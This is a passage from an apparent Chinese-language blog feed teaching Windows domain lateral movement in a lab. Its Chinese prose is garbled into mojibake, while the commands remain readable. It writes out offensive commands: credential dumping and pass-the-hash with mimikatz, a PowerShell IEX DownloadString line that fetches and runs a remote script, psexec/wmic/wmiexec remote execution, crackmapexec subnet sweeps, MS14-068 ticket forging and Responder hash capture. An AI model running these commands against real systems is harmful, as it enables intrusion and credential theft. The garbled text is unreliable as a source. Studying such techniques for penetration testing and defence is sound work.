‡ä¸»æœºä¸Šåˆ›å»ºpsexecæœåŠ¡å¹¶å¯åŠ¨ï¼Œç„¶åå†å®¢æˆ·ç«¯è¿™è¾¹æ‰§è¡Œå‘½ä»¤ï¼ŒæœåŠ¡ç«¯é€šè¿‡ç›¸åº”çš„æœåŠ¡å›æ˜¾æ‰§è¡Œçš„å‘½ä»¤ç»“æœï¼Œæœ€åå†åˆ é™¤ç›¸åº”çš„æœåŠ¡ã€‚</p><p>psexecçš„ä½¿ç”¨å‰æï¼š</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-number">1</span>.admin<span class="hljs-variable">$å…±</span>äº«å¼€å¯<br><span class="hljs-number">2</span>.é˜²ç«å¢™æœªå¼€å¯<br><span class="hljs-number">3</span>.å¦‚æœæ˜¯æœ¬åœ°ç»„çš„ç¯å¢ƒ éœ€è¦æ˜¯ç®¡ç†å‘˜ç»„ç”¨æˆ·ï¼Œå› ä¸ºéœ€è¦åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºæœåŠ¡<br><span class="hljs-number">4</span>.å¦‚æœæ˜¯åŸŸç”¨æˆ·ï¼Œæ™®é€šåŸŸæœºå™¨æ™®é€šåŸŸæˆå‘˜å°±èƒ½ç™»å½•ï¼Œè¿æ¥åŸŸæ§åªèƒ½æ˜¯åŸŸç®¡ç†å‘˜ã€‚<br></code></pre></td></tr></table></figure><p>å…³äºPSexecçš„ä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š</p><p><strong><a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> -u Administrator -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;&quot;</span> -s cmd<span class="hljs-selector-class">.exe</span>  <span class="hljs-comment">//accepteula ç¬¬ä¸€æ¬¡ä½¿ç”¨psexecæ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªç¡®è®¤æ¡†ï¼Œè¿™ä¸ªæ˜¯ä¸å¼¹å‡ºç¡®è®¤æ¡†  -sæ˜¯ä»¥systemæƒé™è¿›è¡Œè¿è¡Œ</span><br><br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> -u Administrator -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;&quot;</span> &lt;Command&gt;<br><br>psexec<span class="hljs-selector-class">.exe</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> cmd<span class="hljs-selector-class">.exe</span> /c <span class="hljs-string">&quot;ipconfig&quot;</span>    <span class="hljs-comment">//è¿™ä¸ªç›¸å½“äºæ˜¯åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰“å¼€äº†cmd ç„¶åè¿è¡Œipconfig</span><br></code></pre></td></tr></table></figure><p>é™¤äº†è¿™ä¸ªexec msfä¸­ä¹Ÿæœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„æ¨¡å—ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ã€‚</p><h2 id="åˆ©ç”¨WMIè¿›è¡Œæ¨ªå‘"><a href="#åˆ©ç”¨WMIè¿›è¡Œæ¨ªå‘" class="headerlink" title="åˆ©ç”¨WMIè¿›è¡Œæ¨ªå‘"></a>åˆ©ç”¨WMIè¿›è¡Œæ¨ªå‘</h2><p>WMIå…¨ç§°ï¼šWindows Management Instrumentation æ˜¯windowsçš„ä¸€ä¸ªç®¡ç†å·¥å…·ï¼Œè‡ªwindows98ä»¥æ¥ï¼Œéƒ½æ”¯æŒæ­¤å·¥å…·ï¼Œé€šè¿‡135ç«¯å£(RPC-&gt;è¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®)ï¼Œç®€å•æ¥è¯´å°±æ˜¯æˆ‘ä»¬å‘é€ä¸€ä¸ªæŒ‡ä»¤åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œç„¶åç›®æ ‡æœåŠ¡å™¨è¿›è¡Œä¸€ä¸ªæ‰§è¡Œï¼Œwmiæ¯”èµ·psexecæ›´åŠ çš„éšè”½ï¼Œä¸ä¼šè®°å½•æ—¥å¿—ä¿¡æ¯ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šå°†æ”»å‡»è„šæœ¬æ·»åŠ åˆ°ç£ç›˜ä¸­ã€‚wmicé»˜è®¤ä½¿ç”¨135ç«¯å£ï¼Œwmicexecä½¿ç”¨445ç«¯å£ã€‚</p><p>è¿™é‡Œæˆ‘çš„ç†è§£æ˜¯ï¼š</p><p>å»ºç«‹ipcç›¸å½“äºæ˜¯èµ°æ­£é—¨ï¼Œéœ€è¦è¿›è¡Œç™»è®°ï¼Œç„¶åå†å»æ‰¾ç›¸å…³äººå‘˜åŠç†ä¸šåŠ¡ï¼Œè€Œwmiæ˜¯ç›´æ¥é€šè¿‡rpc(å®¢æœäººå‘˜)ï¼Œå‘åé¢è¿›è¡Œä¸€ä¸ªé€šçŸ¥ï¼Œç„¶åè¿›è¡ŒåŠç†ä¸šåŠ¡ï¼Œä¸éœ€è¦è¿›è¡Œç™»è®°ï¼Œç›¸å½“äºæ˜¯èµ°çš„åé—¨ã€‚</p><p>è¿œç¨‹æ¡Œé¢è¿æ¥ï¼š                    </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.29</span><span class="hljs-number">.188</span> /<span class="hljs-keyword">USER</span>:Administrator <span class="hljs-type">PATH</span> win32_terminalservicesetting <span class="hljs-keyword">WHERE</span> (__Class!=&quot;&quot;) <span class="hljs-keyword">CALL</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503241855696.png" alt="image-20250324185532243"></p><p>è¡¨ç¤ºæ‰“å¼€æˆåŠŸã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503241856577.png" alt="image-20250324185603400"></p><p>æŸ¥çœ‹è¿œç¨‹è¿›ç¨‹ä¿¡æ¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.29.188 /user:Administrator /password:xxxx process list brief<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503241900339.png" alt="image-20250324190009095"></p><p>è¿œç¨‹åˆ›å»ºè¿›ç¨‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.29</span><span class="hljs-number">.188</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:xxxx process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c whoami &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æ²¡å›æ˜¾çš„ï¼Œä¸€èˆ¬éœ€è¦åˆ©ç”¨ipcè¿æ¥ï¼Œç„¶åtypeçœ‹ä¸€ä¸‹ã€‚</p><p>ä¸‹é¢æ˜¯å‡ ä¸ªå·¥å…·ï¼š</p><p>Impacketä¸­çš„wmiexec.py</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> wmiexec.<span class="hljs-keyword">py</span>  administrator@<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span><br><span class="hljs-keyword">python3</span> wmiexec.<span class="hljs-keyword">py</span> -hashes xxxxxxxx username@ip<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503241937316.png" alt="image-20250324193751970"></p><p>ä½¿ç”¨powershellæ‰§è¡Œå‘½ä»¤</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">IEX</span><span class="hljs-params">(New-Object Net.Webclient)</span></span><span class="hljs-selector-class">.DownloadString</span>(<span class="hljs-string">&#x27;http://192.168.29.157/powersploit/CodeExecution/Invoke-WmiCommand.ps1&#x27;</span>)     <span class="hljs-comment">// ä¸‹è½½è„šæœ¬å¹¶å¯¼å…¥ç³»ç»Ÿ</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;åŸŸå\ç”¨æˆ·å&quot;</span>     <span class="hljs-comment">// æŒ‡å®šç›®æ ‡ç³»ç»Ÿç”¨æˆ·å</span><br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;æ–‡æ˜å¯†ç &quot;</span> -AsPlainText -Force   <span class="hljs-comment">// æŒ‡å®šç›®æ ‡ç³»ç»Ÿçš„å¯†ç </span><br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.PSCredential</span> -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    <span class="hljs-comment">// å°†è´¦å·å’Œå¯†ç æ•´åˆèµ·æ¥ï¼Œä»¥ä¾¿å¯¼å…¥credential</span><br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;è¦æ‰§è¡Œçš„å‘½ä»¤&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName ç›®æ ‡IP<br><span class="hljs-variable">$Remote</span><span class="hljs-selector-class">.PayloadOutput</span>       <span class="hljs-comment">// å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°å±å¹•ä¸Š</span><br></code></pre></td></tr></table></figure><p>éƒ½æ˜¯å†powershellç¯å¢ƒä¸‹è¿è¡Œã€‚</p><h2 id="ä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘"><a href="#ä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘" class="headerlink" title="ä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘"></a>ä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘</h2><p>COMæ˜¯å¾®è½¯ä¸ºäº†ä½¿ä¸åŒç¨‹åºä¹‹é—´èƒ½å¤Ÿè¿›è¡Œè°ƒç”¨ï¼Œä»è€Œè§„å®šçš„ä¸€ä¸ªäºŒè¿›åˆ¶è°ƒç”¨æ ‡å‡†ï¼Œé€šè¿‡å®ä¾‹åŒ–ä¸€ä¸ªCOMç»„ä»¶ï¼Œæ‰¾åˆ°å¯¹åº”çš„æ¥å£ï¼Œç„¶åå†æ¬¡è°ƒç”¨æ¥å£é‡Œé¢çš„åŠŸèƒ½å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°ä¸åŒåŠŸèƒ½çš„å®ç°ï¼Œè€ŒDCOM(åˆ†å¸ƒå¼ç»„ä»¶è°ƒç”¨)ï¼Œèƒ½å¤Ÿè°ƒç”¨å¤–éƒ¨ç½‘ç»œçš„COMç»„ä»¶ï¼Œé€šè¿‡RPCè¿›è¡Œé€šä¿¡ã€‚</p><p>ä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘çš„å‰ææ¡ä»¶ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.å¯èƒ½éœ€è¦å…³é—­å¯¹æ–¹çš„é˜²ç«å¢™<br>2.æœ¬æœºå…·æœ‰ç®¡ç†å‘˜çš„powershell<br>3.æ“ä½œå¯¹æ–¹ä¸»æœºæ—¶ï¼Œéœ€è¦å¯¹æ–¹çš„ç®¡ç†å‘˜è´¦æˆ·ï¼ˆæœ¬æœºç®¡ç†å‘˜æˆ–è€…åŸŸç®¡ç†å‘˜ï¼‰<br></code></pre></td></tr></table></figure><p>è·å–æœ¬åœ°DCOMç¨‹åºåˆ—è¡¨ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">å†powershellçš„ç¯å¢ƒä¸‹è¿è¡Œ<br>powershell <span class="hljs-number">3.0</span> windows <span class="hljs-keyword">server</span> <span class="hljs-number">2012</span>åŠä»¥ä¸Šï¼š <span class="hljs-keyword">Get</span>-CimInstance Win32_DCOMApplication<br>powershell <span class="hljs-number">2.0</span> windows7 windows <span class="hljs-keyword">server</span> <span class="hljs-number">2008</span>: <span class="hljs-keyword">Get</span>-WmiObject -Namespace ROOT\CIMV2 -<span class="hljs-keyword">Class</span> Win32_DCOMApplication<br><br></code></pre></td></tr></table></figure><p>å…¶ä»–èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„DCOMï¼š</p><p>1.MMC20.Application</p><p>2.ShellWindows</p><p>3.Excel.Application</p><p>4.ShellBrowserWindow</p><p>5.Visio.Application</p><p>6.Outlook.Application</p><p>å…·ä½“çš„ä½¿ç”¨å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p><h2 id="PTHæ¨ªå‘"><a href="#PTHæ¨ªå‘" class="headerlink" title="PTHæ¨ªå‘"></a>PTHæ¨ªå‘</h2><p>é€šå¸¸æ˜¯åœ¨åªæŠ“å–åˆ°äº†å¯†æ–‡çš„æƒ…å†µä¸‹çš„åˆ©ç”¨ã€‚</p><p>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œå¤šå°è®¡ç®—æœºè¿›è¡Œå®‰è£…æ—¶ï¼Œé€šå¸¸ä½¿ç”¨è„šæœ¬è¿›è¡Œç»Ÿä¸€å®‰è£…ï¼Œå¯¼è‡´ä¸åŒæœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜çš„è´¦æˆ·å¯†ç éƒ½ä¸€è‡´ï¼Œè¿™æ ·å°±é€ æˆäº†ä¸€ä¸ªé£é™©ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€å°æœºå™¨æ—¶ï¼Œé€šè¿‡æŠ“å–å¯†ç ï¼Œå¯ä»¥å°è¯•è¿›è¡Œå¯†ç çš„å¤ç”¨ã€‚</p><p>ä¸‹é¢æ˜¯åœ¨mimikatz Wmiexec crackmapexecä¸‹çš„åˆ©ç”¨ï¼š</p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503261210103.png" alt="image-20250326121029844"></p><p>åˆ©ç”¨mimikatzå°†å…¶åŠ åˆ°lsasså†…å­˜ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>sekurlsa::pth /user:administrator /domain:workgroup /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503261223345.png" alt="image-20250326122337250"></p><h3 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">00000000000000000000000000000000</span>:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><br>python<span class="hljs-number">3</span> wmiexec.py -hashes <span class="hljs-number">00000000000000000000000000000000</span>:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span> administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.29</span>.<span class="hljs-number">188</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503261308273.png" alt="image-20250326130822144"></p><p>å‰é¢çš„32ä¸ª0ä»£è¡¨çš„æ˜¯ç©ºå¯†ç çš„LM Hashçš„å€¼ã€‚</p><h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><p>åˆ©ç”¨è¿™ä¸ªå¯¹Cæ®µä¸»æœºè¿›è¡Œæ‰¹é‡çš„PTHæ”»å‡»ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">crackmapexec smb ip -u username -H ntlm-hash   //æ‰«æ<span class="hljs-keyword">c</span>æ®µçš„ip å“ªå°æœºå™¨èƒ½è¿›è¡Œå¯†ç å¤ç”¨<br>crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> -u administrator -H <span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span> -d fsrm.com -<span class="hljs-keyword">x</span> whoami<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503261322225.png" alt="image-20250326132247052"></p><h2 id="ç¥¨æ®ä¼ é€’æ”»å‡»-PTT"><a href="#ç¥¨æ®ä¼ é€’æ”»å‡»-PTT" class="headerlink" title="ç¥¨æ®ä¼ é€’æ”»å‡»(PTT)"></a>ç¥¨æ®ä¼ é€’æ”»å‡»(PTT)</h2><p>ä¸»è¦åˆ©ç”¨çš„è¿˜æ˜¯ms14-068 åœ¨äº†è§£è¿™ä¸ªä¹‹å‰æˆ‘ä»¬è¿˜éœ€è¦é‡ç‚¹å»ç†è§£kerberosåè®® è¿™ä¸ªåœ¨åŸŸä¸­å…·æœ‰é‡è¦çš„ä½œç”¨ï¼Œä¸ä»…ä»…æ˜¯åé¢çš„é»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®ï¼Œè¿˜æœ‰ä¸€äº›å§”æ´¾æ”»å‡»ä¹Ÿéœ€è¦ç†è§£kerberosåè®®ã€‚</p><p>è¿™é‡Œå°±ä¸è®²è§£kerberosåè®®äº†ï¼Œå…ˆè®²è®²å®ƒçš„ç”¨æ³•ï¼Œåé¢ä¼šå†åˆ†æä¸€ä¸‹ã€‚</p><p>MS14-068ä¸»è¦è¿˜æ˜¯ä¼ªé€ çš„PACï¼Œå½“AS_REQå‘é€å®Œç”±Client hashåŠ å¯†çš„æ—¶é—´æˆ³æ—¶ï¼ŒKDCä¼šè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œå¦‚æœæ£€æŸ¥ç»“æœåˆæ ¼ï¼Œå°±å‘Clientå‘é€ä¸€ä¸ªTGTï¼ŒTGTé‡Œé¢åŒ…å«ç€PACï¼ŒPACä¸æ˜¯kerberosè‡ªå¸¦çš„ï¼Œè€Œæ˜¯å¾®è½¯åç»­åŠ ä¸Šçš„ï¼Œä¸»è¦æ˜¯æ£€æŸ¥Clientæ˜¯å¦æœ‰ç›¸åº”çš„æƒé™è®¿é—®æœåŠ¡ã€‚åœ¨ç¬¬ä¸€ä¸ªAS_REQé˜¶æ®µï¼Œæ”»å‡»è€…å¯ä»¥å¯¹PACè¿›è¡Œä¸€ä¸ªä¼ªé€ ï¼Œç„¶åå‘é€åˆ°KDCä¸­ï¼ŒKDCæ²¡æœ‰å¯¹å†…å®¹è¿›è¡ŒéªŒè¯ï¼Œç›´æ¥ä½¿ç”¨kertgtçš„hashå¯¹å®ƒè¿›è¡Œç­¾åï¼Œç„¶åå°è£…åœ¨TGTä¸­ï¼Œä»è€Œèƒ½è¿›è¡Œä¸€ä¸ªæœªæˆæƒçš„è®¿é—®ä»»æ„æœåŠ¡ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆKDCä¸ä¼šè¦†ç›–æ‰ç”¨æˆ·çš„PACï¼Œé‚£æ˜¯å› ä¸ºå¾®è½¯å†è®¾è®¡çš„æ—¶å€™çš„ä¸€ä¸ªç¼ºé™·ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u åŸŸç”¨æˆ·å@åŸŸå -s åŸŸç”¨æˆ·çš„SIDå· -d åŸŸæ§ip -<span class="hljs-selector-tag">p</span> åŸŸç”¨æˆ·å¯†ç <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504021846092.png" alt="image-20250402184609907"></p><p>æ­¤æ—¶ä¼šç”Ÿæˆä¸€ä¸ªccacheæ–‡ä»¶ã€‚</p><p>å…ˆæ¸…ç©ºç¥¨æ®ï¼Œç„¶åå¯¼å…¥é‡Œé¢ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge         <span class="hljs-comment">//æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ </span></span><br>mimikatz <span class="hljs-meta"># kerberos::list          <span class="hljs-comment">//æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc ç¥¨æ®æ–‡ä»¶   <span class="hljs-comment">//å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­</span></span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504021850119.png" alt="image-20250402185025973"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504021855457.png" alt="image-20250402185506342"></p><p>æ³¨å…¥ç¥¨æ®ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡psexecæˆ–è€…wmiæ¥è·å–æƒé™ï¼Œæˆ–è€…æ˜¯ç›´æ¥é€šè¿‡scåˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„exeæ–‡ä»¶ï¼Œç„¶åè¿è¡ŒæœåŠ¡å³å¯ã€‚</p><p>æ³¨æ„è¿™é‡Œçš„è¯<code>\\</code>åé¢åªæœ‰è·Ÿä¸»æœºåæ‰èƒ½ç”Ÿæ•ˆã€‚</p><h2 id="Net-NTLM-Relayæ”»å‡»"><a href="#Net-NTLM-Relayæ”»å‡»" class="headerlink" title="Net-NTLM-Relayæ”»å‡»"></a>Net-NTLM-Relayæ”»å‡»</h2><p>ntlmä¸­é—´äººæ”»å‡»ï¼Œå½“ç”¨æˆ·çš„å¯†ç ä¸å¥½çˆ†ç ´æ—¶ï¼Œå¯ä»¥è¯•è¯•è¿™ä¸ªä¸­é—´äººæ”»å‡»ã€‚</p><h3 id="1-åˆ©ç”¨LLMNR-amp-NetBIOS"><a href="#1-åˆ©ç”¨LLMNR-amp-NetBIOS" class="headerlink" title="1.åˆ©ç”¨LLMNR&amp;NetBIOS"></a>1.åˆ©ç”¨LLMNR&amp;NetBIOS</h3><p>è¿™ä¸ªä¸»è¦æ˜¯åˆ©ç”¨äº†windowsç³»ç»Ÿåç§°çš„è§£æé¡ºåºï¼š</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">1</span>.hostsæ–‡ä»¶é‡Œé¢å…ˆè¿›è¡Œè§£æ<br><span class="hljs-number">2</span>.åŸŸåæœåŠ¡å™¨è¿›è¡Œè§£æ<br><span class="hljs-number">3</span>.é“¾è·¯æœ¬åœ°å¤šæ’­åŸŸåè§£æ(LLMNR)å’Œ<span class="hljs-built_in">Net</span>-BIOS<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª1å’Œ2éƒ½è§£æä¸åˆ°çš„åŸŸåæ—¶ï¼Œè¿™æ—¶å®ƒä¼šè¿›è¡Œä¸€ä¸ªå¹¿æ’­ï¼Œå¹¿æ³›çš„è¿›è¡Œè¯¢é—®ï¼Œä½ æ˜¯ä¸æ˜¯æˆ‘è¦è®¿é—®çš„åŸŸåï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ æˆå®¢æˆ·ç«¯è¦è¯·æ±‚çš„åŸŸåï¼Œæ¬ºéª—å®¢æˆ·ç«¯ï¼Œéª—å‡ºå®ƒçš„net-NTLMå“ˆå¸Œçš„å€¼ã€‚</p><p>åˆ©ç”¨çš„ç»å…¸å·¥å…·ï¼šResponder</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -F<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504021909446.png" alt="image-20250402190933185"></p><h3 id="2-åˆ©ç”¨WPAD"><a href="#2-åˆ©ç”¨WPAD" class="headerlink" title="2.åˆ©ç”¨WPAD"></a>2.åˆ©ç”¨WPAD</h3><p>WPADæ˜¯ä¸€ç§ç½‘ç»œä»£ç†è‡ªåŠ¨å‘ç°åè®®ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ æˆä»£ç†æœåŠ¡å™¨ï¼Œè®©å®¢æœç«¯é€šè¿‡WPADä¸‹è½½PACæ–‡ä»¶(ä»£ç†é…ç½®æ–‡ä»¶)ï¼Œè¿™æ—¶æ”»å‡»è€…ä¼šè¦æ±‚å®¢æˆ·ç«¯è¿›è¡Œä¸€ä¸ªéªŒè¯ï¼Œç„¶åæ”»å‡»è€…å°±ä¼šæ”¶åˆ°Net-NTLMå“ˆå¸Œã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/245697.html">https://www.freebuf.com/articles/245697.html</a></p><p><a href="https://www.freebuf.com/articles/network/251364.html">https://www.freebuf.com/articles/network/251364.html</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¨ªå‘åŸºç¡€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Titanic</title>
    <link href="/2025/02/16/HTB-Titanic/"/>
    <url>/2025/02/16/HTB-Titanic/</url>
    
